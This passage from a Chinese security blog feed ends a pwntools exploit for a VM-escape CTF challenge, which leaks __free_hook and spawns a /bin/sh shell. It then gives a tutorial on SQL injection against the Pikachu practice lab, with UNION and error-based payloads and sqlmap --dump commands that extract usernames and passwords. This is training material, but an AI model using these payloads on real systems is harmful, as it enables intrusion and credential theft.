class="hljs-number">0x10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>))  <span class="hljs-comment">#reg[5]=8</span><br>sh.sendline(send_code(<span class="hljs-number">0xC0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>))  <span class="hljs-comment">#reg[4]=reg[4]&lt;&lt;reg[5]=0x10&lt;&lt;8=0x1000</span><br>sh.sendline(send_code(<span class="hljs-number">0x10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0xa</span>))   <span class="hljs-comment">#reg[5]=0xa</span><br>sh.sendline(send_code(<span class="hljs-number">0x10</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>))  <span class="hljs-comment">#reg[6]=4</span><br>sh.sendline(send_code(<span class="hljs-number">0xC0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>))  <span class="hljs-comment">#reg[5]=reg[5]&lt;&lt;reg[6]=0xa&lt;&lt;4=0xa0</span><br>sh.sendline(send_code(<span class="hljs-number">0x70</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>))  <span class="hljs-comment">#reg[4]=reg[4]+reg[5]=0x10a0</span><br>sh.sendline(send_code(<span class="hljs-number">0x70</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>))  <span class="hljs-comment">#reg[2]=reg[4]+reg[2]=_free_hook</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov reg, src20x10 : reg[dest] = src2</span><br><span class="hljs-string">mov reg, 00x20 : reg[dest] = 0</span><br><span class="hljs-string">mov mem, reg            0x30 : reg[dest] = memory[reg[src2]]</span><br><span class="hljs-string">mov reg, mem            0x40 : memory[reg[src2]] = reg[dest]</span><br><span class="hljs-string">push reg                0x50 : stack[result] = reg[dest]</span><br><span class="hljs-string">pop reg                 0x60 : reg[dest] = stack[reg[13]]</span><br><span class="hljs-string">add                     0x70 : reg[dest] = reg[src2] + reg[src1]</span><br><span class="hljs-string">sub                     0x80 : reg[dest] = reg[src1] - reg[src2]</span><br><span class="hljs-string">and                     0x90 : reg[dest] = reg[src2] &amp; reg[src1]</span><br><span class="hljs-string">or                      0xA0 : reg[dest] = reg[src2] | reg[src1]</span><br><span class="hljs-string">^                  0xB0 : reg[dest] = reg[src2] ^ reg[src1]</span><br><span class="hljs-string">left                    0xC0 : reg[dest] = reg[src1] &lt;&lt; reg[src2]</span><br><span class="hljs-string">right                   0xD0 : reg[dest] = reg[src1] &gt;&gt; reg[src2]</span><br><span class="hljs-string">                        0xFF : (exit or print) if(reg[13] != 0) print oper</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>sh.sendline(send_code(<span class="hljs-number">0x10</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>))  <span class="hljs-comment">#reg[4]=8</span><br>sh.sendline(send_code(<span class="hljs-number">0x10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))  <span class="hljs-comment">#reg[5]=0</span><br>sh.sendline(send_code(<span class="hljs-number">0x80</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>))  <span class="hljs-comment">#reg[5]=reg[5]-reg[4]=-8</span><br>sh.sendline(send_code(<span class="hljs-number">0x40</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>))  <span class="hljs-comment">#memory[reg[5]]=reg[2]</span><br>sh.sendline(send_code(<span class="hljs-number">0x10</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>))  <span class="hljs-comment">#reg[4]=7</span><br>sh.sendline(send_code(<span class="hljs-number">0x10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))  <span class="hljs-comment">#reg[5]=0</span><br>sh.sendline(send_code(<span class="hljs-number">0x80</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>))  <span class="hljs-comment">#reg[5]=reg[5]-reg[4]=-7</span><br>sh.sendline(send_code(<span class="hljs-number">0x40</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>))  <span class="hljs-comment">#memory[reg[5]]=reg[3]</span><br><span class="hljs-comment">#gdb.attach(sh)</span><br>sh.sendline(send_code(<span class="hljs-number">0xE0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))  <span class="hljs-comment">#exit and printf</span><br><br><br>sh.recvuntil(<span class="hljs-string">&quot;R2: &quot;</span>)<br>low = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-number">16</span>) + <span class="hljs-number">8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]&quot;</span> + <span class="hljs-built_in">hex</span>(low))<br>sh.recvuntil(<span class="hljs-string">&quot;R3: &quot;</span>)<br>high = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-number">16</span>)<br>free_hook_addr = (high &lt;&lt; <span class="hljs-number">32</span>) + low<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] __free_hook : &quot;</span> + <span class="hljs-built_in">hex</span>(free_hook_addr))<br><br>libc_base = free_hook_addr - libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>log.success(<span class="hljs-built_in">hex</span>(sys_addr))<br>payload = <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span> + p64(sys_addr)<br>sh.send(payload)<br><br><span class="hljs-comment"># gdb.attach(sh)</span><br><br><br>sh. interactive()<br><br></code></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/16285?time__1311=GuD=PRxUxjxfx05DKYYKP7KHOYdbKeQDOjeD#toc-0">vmpwn入门1</a></p><p><a href="https://blog.csdn.net/m0_51251108/article/details/127354652">[OGeek2019 Final]OVM（简易虚拟机逃逸）</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入基础类型</title>
      <link href="/2024/11/29/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/"/>
      <url>/2024/11/29/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入基础类型"><a href="#sql注入基础类型" class="headerlink" title="sql注入基础类型"></a>sql注入基础类型</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SQL注入漏洞主要形成的原因是在数据交互中，站点针对前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行，从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷),sql注入漏洞有许多类型</p><h2 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h2><h3 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h3><h4 id="基于永真语句的手动注入"><a href="#基于永真语句的手动注入" class="headerlink" title="基于永真语句的手动注入"></a>基于永真语句的手动注入</h4><p>SQL语句</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/a"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username,email <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">where</span> id<br></code></pre></td></tr></table></figure><p>可以看到后台会直接把id拼接到sql语句里面进行执行，这里的参数是数字型，不需要闭合，如果让id&#x3D;1 or 1&#x3D;1，拼成的语句就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username,email <span class="hljs-keyword">from</span> <span class="hljs-keyword">member</span> <span class="hljs-keyword">where</span> <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>因为1&#x3D;1永真，所以这里会把所有表列出来</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/b"></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/c"></p><h4 id="基于union的联合手动注入"><a href="#基于union的联合手动注入" class="headerlink" title="基于union的联合手动注入"></a>基于union的联合手动注入</h4><h5 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">在MySQL中有information_schema这个库，该库存放了所有数据库的信息。<br><br>information_schema.<span class="hljs-keyword">columns</span>包含所有表的字段<br>table_schema 数据库名<br><span class="hljs-built_in">table_name</span> 表名<br><span class="hljs-built_in">column_name</span> 列名<br>information_schema.<span class="hljs-keyword">tables</span>包含所有库的表名<br>table_schema 数据库名<br><span class="hljs-built_in">table_name</span> 表名<br>information_schema.schemata包含所有数据库的名<br><span class="hljs-built_in">schema_name</span> 数据库名<br>group_concat()将<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>产生的同一个分组中的值连接起来，返回一个字符串结果。<br></code></pre></td></tr></table></figure><p><strong>concat()函数</strong></p><p>将多个不同字段的字符串连接成一个字符串</p><p><strong>group_concat()</strong></p><p>将多个同字段的字符串连成一个字符串</p><p><strong>order by</strong></p><p>首先先了解一下sql语句中的order by 语句，order by 语句会根据字段的值进行排序(也就是列），但如果一个表只有3列，但是你执行了order by 4,这时就会报错，因此，这个可以用来判断表的字段数</p><p>当输入 order by 2 的时候可以看到正常回显</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/d"></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/e"></p><p>输入order by 3的时候就报错了</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/f"></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/g"></p><p>说明字段数为2</p><p>那么我们就可以基于union进行sql语句的联合执行</p><h5 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(),database()<br></code></pre></td></tr></table></figure><h5 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<br>#这个语句的意思就是从information_schema数据库中找到当前数据库的所有表名，用group_concat()串联起来<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/h"></p><h5 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(column_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>(表名可改)<br>#这个语句的意思是从information_schema数据库中找到当前所有列名，用group_concat()串联起来<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/i"></p><h5 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users<br>#这个更好理解，从users表中查找username和password字段的数据<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/j"></p><h4 id="基于函数报错的注入"><a href="#基于函数报错的注入" class="headerlink" title="基于函数报错的注入"></a>基于函数报错的注入</h4><h5 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h5><p><strong>updatexml（）函数</strong></p><ul><li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li><li>作用：改变文档中符合条件的节点的值</li><li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如&#x2F;&#x2F;title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li><li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li></ul><p><strong>extractvalue（）函数</strong></p><ul><li>此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</li><li>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>select user,password from users where user_id&#x3D;1 and (extractvalue(1,0x7e));</li><li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li></ul><p><strong>floor()函数</strong></p><p>原理：利用select count(*),floor(rand(0)*2)x from information_schema.character_sets group by x;导致数据库报错，通过concat函数连接注入语句与floor(rand(0)*2)函数，实现将注入结果与报错信息回显的注入方式。</p><p>原理有点复杂这里就不描述了，下面会直接上payload,可以结合payload来理解</p><h5 id="updatexml（）函数"><a href="#updatexml（）函数" class="headerlink" title="updatexml（）函数"></a><strong>updatexml（）函数</strong></h5><h6 id="爆库名-1"><a href="#爆库名-1" class="headerlink" title="爆库名"></a>爆库名</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x7e</span>,@<span class="hljs-variable">@datadir</span>),<span class="hljs-number">1</span>)<br>#<span class="hljs-number">0x7e</span>代表<span class="hljs-operator">~</span>，它不是Xpath语句，会报错，报错信息会是这个函数第二关参数的内容<br>#这里就是用concat函数把数据库名，用户名，路径名和<span class="hljs-number">0x7e</span>合成一个不符合Xpath语法的字符串，作为参数，然后让其报错返回信息<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/k"></p><h6 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br>#其实原理类似，通过<span class="hljs-keyword">union</span>语句哪里找到表名，然后作为参数输入，报错返回信息<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/l"></p><h6 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;pikachu&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br>#把字段名作为参数，报错返回<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/m"></p><h6 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> pikachu.users)),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/n"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(password) <span class="hljs-keyword">from</span> pikachu.users)),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/o"></p><h5 id="extractvalue（）函数"><a href="#extractvalue（）函数" class="headerlink" title="extractvalue（）函数"></a><strong>extractvalue（）函数</strong></h5><h6 id="爆库名-2"><a href="#爆库名-2" class="headerlink" title="爆库名"></a>爆库名</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x7e</span>,database()))<br></code></pre></td></tr></table></figure><h6 id="爆表名-2"><a href="#爆表名-2" class="headerlink" title="爆表名"></a>爆表名</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit i,<span class="hljs-number">1</span>)))<br></code></pre></td></tr></table></figure><h6 id="爆字段-1"><a href="#爆字段-1" class="headerlink" title="爆字段"></a>爆字段</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span>)))<br></code></pre></td></tr></table></figure><h6 id="爆内容-1"><a href="#爆内容-1" class="headerlink" title="爆内容"></a>爆内容</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> pikachu.users)))<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(password) <span class="hljs-keyword">from</span> pikachu.users)))<br></code></pre></td></tr></table></figure><h5 id="floor-函数"><a href="#floor-函数" class="headerlink" title="floor()函数"></a><strong>floor()函数</strong></h5><h6 id="爆库名-3"><a href="#爆库名-3" class="headerlink" title="爆库名"></a>爆库名</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),database()) x <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/p"></p><h6 id="爆表名-3"><a href="#爆表名-3" class="headerlink" title="爆表名"></a>爆表名</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit i,<span class="hljs-number">1</span>)) x <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br>#i是可以变的，用来爆出不同的表名<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/q"></p><h6 id="爆字段-2"><a href="#爆字段-2" class="headerlink" title="爆字段"></a>爆字段</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema<span class="hljs-operator">=</span>datab limit i,<span class="hljs-number">1</span>)) x <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br>#同样limit i,<span class="hljs-number">1</span>可变，爆不同的字段<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/r"></p><h6 id="爆内容-2"><a href="#爆内容-2" class="headerlink" title="爆内容"></a>爆内容</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> concat(username,<span class="hljs-number">0x3a</span>,password) <span class="hljs-keyword">from</span> pikachu.users limit i,<span class="hljs-number">1</span>)) x <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br>#i可变<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/s"></p><h3 id="sqlmap注入-POST"><a href="#sqlmap注入-POST" class="headerlink" title="sqlmap注入(POST)"></a><strong>sqlmap注入</strong>(POST)</h3><p>因为是post传参，用sqlmap需要使用到请求时的报文，下列保存为post.txt</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/t"></p><h5 id="爆库名-4"><a href="#爆库名-4" class="headerlink" title="爆库名"></a>爆库名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">sqlmap -r &#x27;/home/joker/桌面/post.txt&#x27; --current-db<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/u"></p><h5 id="爆表名-4"><a href="#爆表名-4" class="headerlink" title="爆表名"></a>爆表名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">sqlmap -r &quot;/home/joker/桌面/post.txt&quot; -p id -D pikachu --tables<br>#-p是为了指定参数，pikachu中的参数是id<br>#-D 这个参数指向的是数据库名<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/v"></p><h5 id="爆字段-3"><a href="#爆字段-3" class="headerlink" title="爆字段"></a>爆字段</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">sqlmap -r &quot;/home/joker/桌面/post.txt&quot; -p id -D pikachu -T users --columns<br>#-T 这个参数指向的就是表名<br>#--columns 这个查找字段<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/w"></p><h5 id="爆内容-3"><a href="#爆内容-3" class="headerlink" title="爆内容"></a>爆内容</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">sqlmap -r &quot;/home/joker/桌面/post.txt&quot; -p id -D pikachu -T users -C &quot;username,password&quot; --dump<br>#--dump 这个参数与前面四个结合为了输出所有数据<br></code></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B/x"></p><h2 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h2><h3 